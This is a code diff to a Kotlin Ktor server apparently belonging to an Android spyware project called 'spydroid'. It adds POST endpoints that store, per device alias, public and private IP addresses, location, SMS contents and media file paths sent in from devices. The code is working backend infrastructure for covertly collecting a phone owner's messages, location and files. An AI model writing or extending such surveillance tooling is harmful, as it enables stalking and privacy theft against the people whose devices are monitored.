@@ -29,6 +29,9 @@ import net.spydroid.server.domain.InfoRepository
 import net.spydroid.server.domain.MultimediaRepository
 import net.spydroid.server.domain.SmsRepository
 import net.spydroid.server.models.DeviceHandler
+import net.spydroid.server.models.InfoHandler
+import net.spydroid.server.models.MultimediaHandler
+import net.spydroid.server.models.SmsHandler
 import org.koin.ktor.ext.inject
 
 
@@ -109,6 +112,51 @@ private fun Route.info(validTokens: Set<String>){
             call.respond(info)
         }
     }
+
+    post(Routes.INFO) {
+        val params = call.receiveParameters()
+        val accessToken = params["access_token"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing access token"
+        )
+        val alias = params["alias"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing alias"
+        )
+        val ip_address_public = params["ip_public"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing name"
+        )
+
+        val ip_address_private = params["ip_private"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing name"
+        )
+
+        val location = params["location"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing name"
+        )
+
+        if (accessToken in validTokens) {
+            this.launch(Dispatchers.IO) {
+                infoRepository.insert(
+                    InfoHandler(
+                        alias = alias,
+                        ip_address_public = ip_address_public,
+                        ip_address_private = ip_address_private,
+                        location = location
+                    )
+                )
+            }
+            call.respond(
+                HttpStatusCode.OK,
+                "Device with alias '$alias', and ip public $ip_address_public was processed successfully!"
+            )
+        } else {
+            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
+        }
+    }
 }
 
 private fun Route.sms(validTokens: Set<String>){
@@ -122,6 +170,39 @@ private fun Route.sms(validTokens: Set<String>){
             call.respond(sms)
         }
     }
+
+    post(Routes.SMS) {
+        val params = call.receiveParameters()
+        val accessToken = params["access_token"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing access token"
+        )
+        val alias = params["alias"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing alias"
+        )
+        val sms = params["sms"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing name"
+        )
+
+        if (accessToken in validTokens) {
+            this.launch(Dispatchers.IO) {
+                smsRepository.insert(
+                    SmsHandler(
+                        alias = alias,
+                        sms = sms
+                    )
+                )
+            }
+            call.respond(
+                HttpStatusCode.OK,
+                "Device with alias '$alias', and sms $sms was processed successfully!"
+            )
+        } else {
+            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
+        }
+    }
 }
 
 private fun Route.multimedia(validTokens: Set<String>){
@@ -133,6 +214,45 @@ private fun Route.multimedia(validTokens: Set<String>){
         val multimedia = multimediaRepository.getAllMultimedia()
         if (accessToken in validTokens) {
             call.respond(multimedia)
+        }
+    }
+
+    post(Routes.MULTIMEDIA) {
+        val params = call.receiveParameters()
+        val accessToken = params["access_token"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing access token"
+        )
+        val alias = params["alias"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing alias"
+        )
+        val routeFile = params["routeFile"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing name"
+        )
+
+        val type = params["type"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing name"
+        )
+
+        if (accessToken in validTokens) {
+            this.launch(Dispatchers.IO) {
+                multimediaRepository.insert(
+                    MultimediaHandler(
+                        alias = alias,
+                        routeFile = routeFile,
+                        type = type
+                    )
+                )
+            }
+            call.respond(
+                HttpStatusCode.OK,
+                "Device with alias '$alias', '$routeFile' and type $type was processed successfully!"
+            )
+        } else {
+            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
         }
     }
 }
